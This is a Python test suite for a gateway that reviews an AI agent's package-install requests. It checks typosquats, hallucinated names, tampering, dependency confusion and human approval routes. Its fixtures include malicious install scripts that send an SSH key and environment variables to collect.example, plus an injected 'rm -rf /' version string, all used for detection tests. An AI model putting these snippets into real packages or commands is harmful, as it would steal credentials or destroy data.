import base64
import hashlib
import io
import json
import tarfile
import zipfile
from datetime import datetime, timedelta, timezone
from uuid import uuid4

import httpx
import pytest
from fastapi.testclient import TestClient

from app.main import create_app
from gateway import Gateway
from gateway.events import MemoryEventStore
from gateway.session import Session
from gateway.upstream import InProcessUpstream
from packages import (
    LocalQuarantine, MemoryReviewStore, NotPending, PackageReviewer, ReplacementRefused,
)
from packages.existence import edit_distance, similar_popular
from packages.install import InstallError
from packages.score import needs_human, risk_level, risk_score, signal
from tests import fakes
from vault import MemoryTokenStore, Pseudonymizer, Scanner

pytestmark = pytest.mark.anyio

NOW = datetime(2026, 10, 10, 12, 0, tzinfo=timezone.utc)
OLD = "2019-03-01T10:00:00.000000Z"
ANALYST = str(uuid4())


@pytest.fixture
def anyio_backend():
    return "asyncio"


def tgz(files: dict[str, str]) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for name, text in files.items():
            data = text.encode()
            member = tarfile.TarInfo(name)
            member.size = len(data)
            archive.addfile(member, io.BytesIO(data))
    return buffer.getvalue()


def wheel(files: dict[str, str]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        for name, text in files.items():
            archive.writestr(name, text)
    return buffer.getvalue()


class Registry:
    """Faux PyPI, npm et OSV servis par un transport httpx en mémoire."""

    def __init__(self):
        self.pypi: dict[str, dict] = {}
        self.npm: dict[str, dict] = {}
        self.files: dict[str, bytes] = {}
        self.vulns: dict[str, list] = {}
        self.down = False
        self.requests: list[str] = []

    def add_pypi(self, name, version, archive, *, sdist=False, created=OLD, repo=True, versions=5, digest=None):
        filename = f"{name}-{version}.tar.gz" if sdist else f"{name}-{version}-py3-none-any.whl"
        url = f"https://files.pythonhosted.org/packages/{filename}"
        self.files[url] = archive
        release = [{
            "filename": filename, "url": url, "packagetype": "sdist" if sdist else "bdist_wheel",
            "upload_time_iso_8601": created,
            "digests": {"sha256": digest or hashlib.sha256(archive).hexdigest()},
        }]
        releases = {f"0.{i}.0": [{"upload_time_iso_8601": created, "filename": "x", "url": "x",
                                  "packagetype": "sdist", "digests": {"sha256": "0"}}]
                    for i in range(versions - 1)}
        releases[version] = release
        self.pypi[name] = {
            "info": {"version": version,
                     "project_urls": {"Source": f"https://github.com/acme/{name}"} if repo else {}},
            "releases": releases,
        }

    def add_npm(self, name, version, archive, *, created=OLD):
        url = f"https://registry.npmjs.org/{name}/-/{name}-{version}.tgz"
        self.files[url] = archive
        integrity = "sha512-" + base64.b64encode(hashlib.sha512(archive).digest()).decode()
        self.npm[name] = {
            "dist-tags": {"latest": version},
            "versions": {v: {"dist": {"tarball": url, "integrity": integrity}} for v in ("1.0.0", version)},
            "time": {"created": created, version: created},
            "maintainers": [{"name": "a"}, {"name": "b"}],
            "repository": {"url": f"git+https://github.com/acme/{name}.git"},
        }

    def handler(self, request: httpx.Request) -> httpx.Response:
        url = str(request.url)
        self.requests.append(url)
        if self.down:
            raise httpx.ConnectError("réseau coupé")
        if url == "https://api.osv.dev/v1/query":
            name = json.loads(request.content)["package"]["name"]
            return httpx.Response(200, json={"vulns": self.vulns.get(name, [])})
        if url in self.files:
            return httpx.Response(200, content=self.files[url])
        if url.startswith("https://pypi.org/pypi/"):
            data = self.pypi.get(url.split("/")[4])
        else:
            data = self.npm.get(url.removeprefix("https://registry.npmjs.org/").replace("%2F", "/"))
        return httpx.Response(200, json=data) if data else httpx.Response(404, json={"message": "Not Found"})


class RecordedInstalls:
    def __init__(self):
        self.calls = []
        self.fail = False

    async def install(self, ecosystem, name, version, archive):
        if self.fail:
            raise InstallError("pip en échec")
        self.calls.append((ecosystem, name, version, archive))
        return {"installed": True, "simulated": False}

    async def uninstall(self, ecosystem, name):
        self.calls.append(("uninstall", name))
        return {"removed": True, "simulated": False}


class Env:
    def __init__(self, tmp_path):
        self.registry = Registry()
        self.store = MemoryReviewStore()
        self.events = MemoryEventStore()
        self.installs = RecordedInstalls()
        self.pseudonymizer = Pseudonymizer(MemoryTokenStore(), Scanner())
        self.client = httpx.AsyncClient(transport=httpx.MockTransport(self.registry.handler))
        self.quarantine_dir = tmp_path / "quarantine"
        self.reviewer = PackageReviewer(
            self.store, self.events, self.pseudonymizer, self.client,
            LocalQuarantine(self.quarantine_dir), self.installs, now=lambda: NOW,
        )
        self.session = Session(agent_id="DevBot")

    async def request(self, ecosystem, name, version=None):
        event_id = await self.events.insert(_request_event(self.session.trace_id))
        return await self.reviewer.review(self.session, event_id, ecosystem, name, version)

    def review(self, outcome):
        return next(r for r in self.store.reviews.values() if str(r["id"]) == outcome["review_id"])

    def codes(self, outcome):
        return {s["code"] for s in self.review(outcome)["checks"]["signals"]}

    def event_types(self):
        return [(e.event_type, e.result) for _, e in self.events.events]


def _request_event(trace_id):
    from gateway.events import EventRecord
    return EventRecord(trace_id=trace_id, event_type="package_install_requested", actor_type="agent",
                       actor_id="DevBot")


@pytest.fixture
def env(tmp_path):
    return Env(tmp_path)


CLEAN = wheel({"cleanlib/__init__.py": "def add(a, b):\n    return a + b\n"})


# --- règles pures -----------------------------------------------------------

def test_edit_distance_counts_a_swap_as_one_typo():
    assert edit_distance("reqeusts", "requests") == 1
    assert edit_distance("requests", "requests") == 0
    assert edit_distance("flask", "black") == 2


def test_typosquat_targets_popular_names_only():
    assert similar_popular("pypi", "reqeusts") == "requests"
    assert similar_popular("pypi", "requests") is None
    assert similar_popular("pypi", "Python_Dateutil") is None  # même nom une fois normalisé
    assert similar_popular("npm", "lodahs") == "lodash"
    assert similar_popular("pypi", "cleanlib") is None


def test_score_is_a_fixed_sum_and_blocking_overrides_it():
    quiet = [signal("no_source_repository", "x"), signal("single_release", "x")]
    assert risk_score(quiet) == 0.2 and not needs_human(quiet) and risk_level(quiet) == "low"
    at_threshold = quiet + [signal("known_vulnerability", "x")]
    assert risk_score(at_threshold) == 0.3 and needs_human(at_threshold)
    assert risk_score([signal("typosquat", "x"), signal("typosquat", "y")]) == 0.4  # un code compte une fois
    assert needs_human([signal("package_not_found", "x")]) and risk_level([signal("package_not_found", "x")]) == "critical"


# --- demandes d'un agent ----------------------------------------------------

async def test_hallucinated_package_waits_for_a_human(env):
    outcome = await env.request("pypi", "fastjson-turbo-utils")

    assert outcome["status"] == "blocked_pending_review"
    review = env.review(outcome)
    assert review["state"] == "pending_approval" and review["risk_level"] == "critical"
    assert env.codes(outcome) == {"package_not_found"}
    assert review["checks"]["recommended_decision"] == "reject"
    assert env.installs.calls == [] and env.store.installed == []
    assert not any("files.pythonhosted.org" in u for u in env.registry.requests)  # rien téléchargé
    [alert] = env.store.alerts
    assert (alert["source"], alert["signal"], alert["severity"]) == (
        "sentinelle", "suspicious_package_install", "critical")
    assert alert["trace_id"] == env.session.trace_id and alert["affected_agent"] == "DevBot"
    assert ("package_review", "pending") in env.event_types()


async def test_clean_package_is_installed_automatically(env):
    env.registry.add_pypi("cleanlib", "2.1.0", CLEAN)

    outcome = await env.request("pypi", "cleanlib")

    assert outcome["status"] == "installed" and outcome["risk_score"] == 0.0
    review = env.review(outcome)
    assert (review["state"], review["decided_by"], review["version"]) == ("executed", "automatique", "2.1.0")
    assert review["artifact_sha256"] == hashlib.sha256(CLEAN).hexdigest()
    [(ecosystem, name, version, archive)] = env.installs.calls
    assert (ecosystem, name, version) == ("pypi", "cleanlib", "2.1.0") and archive.read_bytes() == CLEAN
    assert env.store.installed[0]["dependency"] == "pypi:cleanlib@2.1.0"
    assert env.store.alerts == [] and env.store.quarantined == []
    assert env.event_types()[-2:] == [("package_review", "success"), ("dependency_installed", "success")]


async def test_typosquat_is_blocked_and_the_real_name_is_suggested(env):
    env.registry.add_pypi("reqeusts", "1.0.0", CLEAN)

    outcome = await env.request("pypi", "reqeusts")

    assert outcome["status"] == "blocked_pending_review"
    checks = env.review(outcome)["checks"]
    assert "typosquat" in env.codes(outcome)
    assert (checks["recommended_decision"], checks["suggested_replacement"]) == ("replace", "requests")
    assert env.installs.calls == []


async def test_malicious_install_script_is_caught_without_running_it(env):
    key = fakes.aws_key()
    setup = (
        "import base64, os, urllib.request\n"
        "from setuptools import setup\n"
        f"KEY = '{key}'\n"
        "exec(base64.b64decode('cHJpbnQoMSk='))\n"
        "urllib.request.urlopen('https://collect.example/x', data=open(os.path.expanduser('~/.ssh/id_rsa')).read())\n"
        "setup(name='evilpkg')\n"
    )
    archive = tgz({"evilpkg-1.0.0/setup.py": setup, "evilpkg-1.0.0/evilpkg/__init__.py": ""})
    env.registry.add_pypi("evilpkg", "1.0.0", archive, sdist=True, created="2026-10-08T10:00:00Z",
                          repo=False, versions=1)

    outcome = await env.request("pypi", "evilpkg")

    assert outcome["status"] == "blocked_pending_review"
    assert env.codes(outcome) >= {
        "install_script", "network_in_install_script", "obfuscated_code", "exfiltration_pattern",
        "embedded_secret", "recently_created", "no_source_repository", "single_release"}
    review = env.review(outcome)
    assert review["risk_level"] == "critical"
    excerpts = review["evidence"]["excerpts"]
    assert any(e["file"].endswith("setup.py") and "exec(" in e["code"] for e in excerpts)
    assert key not in json.dumps(review, default=str)  # le secret embarqué n'est jamais recopié
    [quarantined] = env.store.quarantined
    assert quarantined["artifact_sha256"] == hashlib.sha256(archive).hexdigest()
    assert env.reviewer._quarantine.path(quarantined["storage_ref"]).read_bytes() == archive
    assert env.installs.calls == []


async def test_wheel_is_preferred_so_a_setup_py_that_would_not_run_is_ignored(env):
    env.registry.add_pypi("cleanlib", "2.1.0", CLEAN)
    env.registry.pypi["cleanlib"]["releases"]["2.1.0"].insert(0, {
        "filename": "cleanlib-2.1.0.tar.gz", "url": "https://files.pythonhosted.org/packages/never",
        "packagetype": "sdist", "upload_time_iso_8601": OLD, "digests": {"sha256": "0"}})

    assert (await env.request("pypi", "cleanlib"))["status"] == "installed"


async def test_npm_postinstall_hook_goes_to_a_human(env):
    archive = tgz({
        "package/package.json": json.dumps({"name": "leftpadx", "scripts": {"postinstall": "node setup.js"}}),
        "package/setup.js": "require('https').get('https://collect.example/' + JSON.stringify(process.env))\n",
    })
    env.registry.add_npm("leftpadx", "3.0.0", archive)

    outcome = await env.request("npm", "leftpadx")

    assert outcome["status"] == "blocked_pending_review"
    assert env.codes(outcome) >= {"install_script", "network_in_install_script", "exfiltration_pattern"}


async def test_tampered_archive_is_blocking(env):
    env.registry.add_pypi("cleanlib", "2.1.0", CLEAN, digest="0" * 64)

    outcome = await env.request("pypi", "cleanlib")

    assert outcome["status"] == "blocked_pending_review" and env.codes(outcome) == {"digest_mismatch"}
    assert not any(p.is_file() for p in env.quarantine_dir.rglob("*"))


async def test_critical_vulnerability_goes_to_a_human(env):
    env.registry.add_pypi("cleanlib", "2.1.0", CLEAN)
    env.registry.vulns["cleanlib"] = [{"id": "GHSA-xxxx", "database_specific": {"severity": "CRITICAL"}}]

    outcome = await env.request("pypi", "cleanlib")

    assert outcome["status"] == "blocked_pending_review" and env.codes(outcome) == {"critical_vulnerability"}


async def test_unreachable_registry_never_auto_approves(env):
    env.registry.down = True

    outcome = await env.request("pypi", "cleanlib")

    assert outcome["status"] == "blocked_pending_review" and env.codes(outcome) == {"registry_unavailable"}


async def test_unknown_version_is_blocking(env):
    env.registry.add_pypi("cleanlib", "2.1.0", CLEAN)

    outcome = await env.request("pypi", "cleanlib", "9.9.9")

    assert env.codes(outcome) == {"version_not_found"}


async def test_internal_allowlist_passes_without_touching_public_registries(env):
    env.store.internal.append({"registry": "npm", "name": "@demo/cli", "version": "1.3.1",
                               "status": "approved", "artifact_sha256": "a" * 64, "artifact_location": "x"})

    outcome = await env.request("npm", "@demo/cli", "1.3.1")

    assert outcome["status"] == "installed" and env.registry.requests == []
    assert env.review(outcome)["checks"]["internal_allowlist"] is True


async def test_internal_name_with_unlisted_version_is_dependency_confusion(env):
    env.store.internal.append({"registry": "npm", "name": "@demo/cli", "version": "1.3.1",
                               "status": "approved", "artifact_sha256": "a" * 64, "artifact_location": "x"})
    env.registry.add_npm("@demo/cli", "99.0.0", tgz({"package/package.json": "{}"}))

    outcome = await env.request("npm", "@demo/cli", "99.0.0")

    assert outcome["status"] == "blocked_pending_review" and "dependency_confusion" in env.codes(outcome)


@pytest.mark.parametrize("ecosystem,name,version", [
    ("cargo", "serde", None), ("pypi", "../../etc/passwd", None), ("pypi", "a b", None),
    ("npm", "Left/../pad", None), ("pypi", "requests", "1.0 && rm -rf /"),
])
async def test_malformed_request_is_refused_before_any_lookup(env, ecosystem, name, version):
    outcome = await env.request(ecosystem, name, version)

    assert outcome["status"] == "blocked" and env.registry.requests == [] and env.store.reviews == {}


async def test_repeated_request_reuses_the_pending_review(env):
    first = await env.request("pypi", "ghostpkg")
    second = await env.request("pypi", "ghostpkg")

    assert second["review_id"] == first["review_id"] and len(env.store.alerts) == 1


async def test_failed_install_is_reported_as_blocked(env):
    env.registry.add_pypi("cleanlib", "2.1.0", CLEAN)
    env.installs.fail = True

    outcome = await env.request("pypi", "cleanlib")

    assert outcome["status"] == "blocked" and env.review(outcome)["state"] == "failed"
    assert env.store.installed == []


# --- décision de l'analyste -------------------------------------------------

async def pending_typosquat(env):
    env.registry.add_pypi("reqeusts", "1.0.0", CLEAN)
    env.registry.add_pypi("requests", "2.32.0", CLEAN)
    outcome = await env.request("pypi", "reqeusts")
    return env.review(outcome)["id"]


async def test_approval_installs_the_quarantined_archive_once(env):
    review_id = await pending_typosquat(env)

    result = await env.reviewer.decide(review_id, "approve", decided_by=ANALYST, note="vérifié")

    assert result["state"] == "executed"
    review = env.store.reviews[review_id]
    assert (review["state"], review["decided_by"], review["decision_note"]) == ("executed", ANALYST, "vérifié")
    assert [c[1] for c in env.installs.calls] == ["reqeusts"]
    decision = [e for _, e in env.events.events if e.actor_type == "user"]
    assert [(e.event_type, e.action, e.result, e.actor_id) for e in decision] == [
        ("package_review", "approve", "success", ANALYST)]
    with pytest.raises(NotPending):
        await env.reviewer.decide(review_id, "reject", decided_by=ANALYST)


async def test_rejection_installs_nothing_and_leaves_an_event_for_the_investigation(env):
    review_id = await pending_typosquat(env)
    request_event = env.store.reviews[review_id]["checks"]["request_event_id"]

    result = await env.reviewer.decide(review_id, "reject", decided_by=ANALYST)

    assert result["state"] == "rejected" and env.installs.calls == []
    rejection = env.events.events[-1][1]
    assert (rejection.event_type, rejection.result, str(rejection.parent_event_id)) == (
        "package_review", "blocked", request_event)
    assert rejection.trace_id == env.session.trace_id


async def test_replacement_rejects_the_suspect_and_installs_the_trusted_package(env):
    review_id = await pending_typosquat(env)

    result = await env.reviewer.decide(review_id, "replace", decided_by=ANALYST, replacement_name="requests")

    original = env.store.reviews[review_id]
    assert original["state"] == "rejected" and "pypi:requests@2.32.0" in original["decision_note"]
    replacement = next(r for r in env.store.reviews.values() if str(r["id"]) == result["replacement_review_id"])
    assert (replacement["state"], replacement["decided_by"], replacement["package_name"]) == (
        "executed", ANALYST, "requests")
    assert replacement["checks"]["replaces_review_id"] == str(review_id)
    assert [c[1] for c in env.installs.calls] == ["requests"]


async def test_replacement_by_a_nonexistent_package_changes_nothing(env):
    review_id = await pending_typosquat(env)

    with pytest.raises(ReplacementRefused):
        await env.reviewer.decide(review_id, "replace", decided_by=ANALYST, replacement_name="requestz-pro")

    assert env.store.reviews[review_id]["state"] == "pending_approval" and env.installs.calls == []


async def test_approving_a_hallucinated_package_cannot_install_anything(env):
    outcome = await env.request("pypi", "ghostpkg")

    result = await env.reviewer.decide(env.review(outcome)["id"], "approve", decided_by=ANALYST)

    assert result["state"] == "failed" and env.installs.calls == [] and env.store.installed == []


# --- route HTTP et passerelle -----------------------------------------------

class FakeAuth:
    def __init__(self, tokens):
        self.tokens = tokens

    async def user_id(self, access_token):
        return self.tokens.get(access_token)


async def test_decision_route_requires_an_authenticated_analyst(env):
    review_id = await pending_typosquat(env)
    outsider = str(uuid4())
    env.store.analysts[ANALYST] = {"user_id": ANALYST, "can_approve_packages": True}
    gateway = Gateway(env.events, env.pseudonymizer, packages=env.reviewer)
    app = create_app(gateway=gateway, packages=env.reviewer,
                     analyst_auth=FakeAuth({"good": ANALYST, "outsider": outsider}))
    url, body = f"/packages/{review_id}/decision", {"decision": "reject", "note": "typosquat"}

    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as http:
        assert (await http.post(url, json=body)).status_code == 401
        assert (await http.post(url, json=body, headers={"authorization": "Bearer forged"})).status_code == 401
        assert (await http.post(url, json=body, headers={"authorization": "Bearer outsider"})).status_code == 403
        assert env.store.reviews[review_id]["state"] == "pending_approval"
        assert (await http.post(url, json={"decision": "replace"},
                                headers={"authorization": "Bearer good"})).status_code == 422
        ok = await http.post(url, json=body, headers={"authorization": "Bearer good"})
        assert ok.status_code == 200 and ok.json()["state"] == "rejected"
        assert env.store.reviews[review_id]["decided_by"] == ANALYST
        assert (await http.post(url, json=body, headers={"authorization": "Bearer good"})).status_code == 409
        missing = await http.post(f"/packages/{uuid4()}/decision", json=body,
                                  headers={"authorization": "Bearer good"})
        assert missing.status_code == 404


def test_decision_route_is_closed_when_auth_is_not_configured(env):
    app = create_app(gateway=Gateway(env.events, env.pseudonymizer), packages=env.reviewer)
    response = TestClient(app).post(f"/packages/{uuid4()}/decision", json={"decision": "approve"},
                                    headers={"authorization": "Bearer x"})
    assert response.status_code == 503


async def test_gateway_routes_install_package_through_the_review(env):
    real_installs = []
    upstream = InProcessUpstream("mcp_demo")

    def install_package(ecosystem, name, version=None):
        real_installs.append(name)
        return {"installed": True}

    upstream.add(install_package, description="Installe un package.")
    gateway = Gateway(env.events, env.pseudonymizer, packages=env.reviewer)
    await gateway.register(upstream)
    env.registry.add_pypi("cleanlib", "2.1.0", CLEAN)
    session = gateway.open_session("DevBot")
    await gateway.record_query(session, "installe ce qu'il faut")

    blocked = await gateway.dispatch(session, "install_package", {"ecosystem": "pypi", "name": "ghostpkg"})
    installed = await gateway.dispatch(session, "install_package", {"ecosystem": "pypi", "name": "cleanlib"})

    assert blocked["status"] == "blocked_pending_review" and installed["status"] == "installed"
    assert real_installs == []  # l'outil réel n'est jamais appelé
    responses = [(e.result, e.metadata["package_status"]) for _, e in env.events.events
                 if e.event_type == "tool_response"]
    assert responses == [("pending", "blocked_pending_review"), ("success", "installed")]
    review = next(r for r in env.store.reviews.values() if r["package_name"] == "ghostpkg")
    request = next(i for i, e in env.events.events
                   if e.event_type == "package_install_requested" and "ghostpkg" in e.resource_id)
    assert review["checks"]["request_event_id"] == str(request) and review["trace_id"] == session.trace_id



# --- retrait après contre-vérification -----------------------------------------------------------

async def test_removal_uninstalls_and_rejects_an_approved_package(env):
    review_id = await pending_typosquat(env)
    await env.reviewer.decide(review_id, "approve", decided_by=ANALYST)
    assert len(env.store.installed) == 1

    result = await env.reviewer.remove(review_id, decided_by=ANALYST, reason="contre-vérification non positive")

    assert result["state"] == "rejected" and result["inventory_rows_removed"] == 1
    assert env.installs.calls[-1] == ("uninstall", "reqeusts") and env.store.installed == []
    review = env.store.reviews[review_id]
    assert review["state"] == "rejected" and review["execution_result"]["removal"]["removed_by"] == ANALYST
    removal = env.events.events[-1][1]
    assert (removal.event_type, removal.action, removal.result, removal.actor_id) == (
        "package_review", "remove", "success", ANALYST)


async def test_a_package_never_approved_cannot_be_removed(env):
    review_id = await pending_typosquat(env)
    with pytest.raises(NotPending):
        await env.reviewer.remove(review_id, decided_by=ANALYST, reason="x")


async def test_removal_route_requires_the_confinement_token(env):
    review_id = await pending_typosquat(env)
    await env.reviewer.decide(review_id, "approve", decided_by=ANALYST)
    app = create_app(gateway=Gateway(env.events, env.pseudonymizer, packages=env.reviewer), packages=env.reviewer)
    app.state.confinement_token = "jeton-confinement"
    url, body = f"/packages/{review_id}/removal", {"demande_par": ANALYST, "raison": "contre-vérification"}
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as http:
        assert (await http.post(url, json=body)).status_code == 401
        ok = await http.post(url, json=body, headers={"authorization": "Bearer jeton-confinement"})
        assert ok.status_code == 200 and ok.json()["state"] == "rejected"
        again = await http.post(url, json=body, headers={"authorization": "Bearer jeton-confinement"})
        assert again.status_code == 409


class FakeBridge:
    def __init__(self):
        self.requests = []

    async def request_reverification(self, reviewer, review_id, decided_by):
        self.requests.append((review_id, decided_by))


async def test_human_approval_triggers_the_defenders_reverification(env):
    approved = await pending_typosquat(env)
    env.store.analysts[ANALYST] = {"user_id": ANALYST, "can_approve_packages": True}
    app = create_app(gateway=Gateway(env.events, env.pseudonymizer, packages=env.reviewer), packages=env.reviewer,
                     analyst_auth=FakeAuth({"good": ANALYST}))
    app.state.defense = bridge = FakeBridge()
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as http:
        ok = await http.post(f"/packages/{approved}/decision", json={"decision": "approve"},
                             headers={"authorization": "Bearer good"})
        assert ok.status_code == 200
    assert bridge.requests == [(approved, ANALYST)]


async def test_a_package_quarantined_by_an_analyst_is_refused_before_any_review(env, tmp_path):
    from gateway.defense import DefenseBridge
    bridge = DefenseBridge(None, None, "http://localhost:8000", "test", tmp_path / "state.sqlite")
    bridge.quarantine_package("pypi:ghostpkg@1.0", "INC-test", ANALYST)
    upstream = InProcessUpstream("mcp_demo")
    upstream.add(lambda ecosystem, name, version=None: {"installed": True}, name="install_package", description="Installe.")
    gateway = Gateway(env.events, env.pseudonymizer, packages=env.reviewer, defense=bridge)
    await gateway.register(upstream)
    session = gateway.open_session("DevBot")
    await gateway.record_query(session, "installe ghostpkg")

    refused = await gateway.dispatch(session, "install_package", {"ecosystem": "pypi", "name": "GhostPkg"})

    assert refused == {"status": "blocked", "reason": "quarantined_by_analyst"}
    assert env.store.reviews == {} and env.registry.requests == []
